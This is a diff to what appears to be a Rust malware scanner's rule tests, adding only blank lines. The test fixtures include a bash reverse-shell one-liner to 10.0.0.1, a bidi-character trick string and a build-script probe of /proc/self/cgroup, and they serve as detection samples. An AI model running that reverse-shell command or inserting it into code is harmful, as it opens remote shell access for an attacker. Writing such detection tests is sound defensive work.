@@ -69,6 +69,7 @@ impl Rules {
         let Ok(results) = scanner.scan(data) else {
             return Vec::new();
         };
+
         results
             .matching_rules()
             .filter_map(|rule| {
@@ -84,6 +85,7 @@ impl Rules {
                         _ => {}
                     }
                 }
+
                 Some(Finding {
                     kind: FindingKind::YaraMatch {
                         rule: rule.identifier().to_owned(),
@@ -144,8 +146,10 @@ mod tests {
             rules_matching("let admin = \"user\u{202E} \u{2066}// check\";".as_bytes()),
             vec!["bidi_control_characters"]
         );
+
         let mut elf = vec![0x7F, b'E', b'L', b'F'];
         elf.extend([0_u8; 60]);
+
         assert_eq!(rules_matching(&elf), vec!["embedded_elf_executable"]);
         assert!(
             rules_matching(b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
@@ -157,6 +161,7 @@ mod tests {
     fn source_only_rules_skip_data_files() {
         let rules = Rules::builtin().unwrap();
         let bidi = "x\u{202E}y".as_bytes();
+
         assert!(
             rules
                 .scan("assets/cat.gif", bidi, CodeContext::Library)
@@ -174,10 +179,13 @@ mod tests {
         let rules = Rules::builtin().unwrap();
         let source = b"fn main() {\n    // probe\n    std::fs::read(\"/proc/self/cgroup\");\n}\n";
         let found = rules.scan("build.rs", source, CodeContext::BuildScript);
+
         assert_eq!(found[0].line, Some(3));
+
         let mut elf = vec![0x7F, b'E', b'L', b'F', 0xFF];
         elf.extend([0_u8; 60]);
         let found = rules.scan("lib.so", &elf, CodeContext::Library);
+
         assert_eq!(found[0].line, None);
     }
 
@@ -194,6 +202,7 @@ mod tests {
             b"std::fs::read(\"/proc/self/cgroup\")",
             CodeContext::BuildScript,
         );
+
         assert_eq!(findings[0].severity, Severity::High);
     }
 }
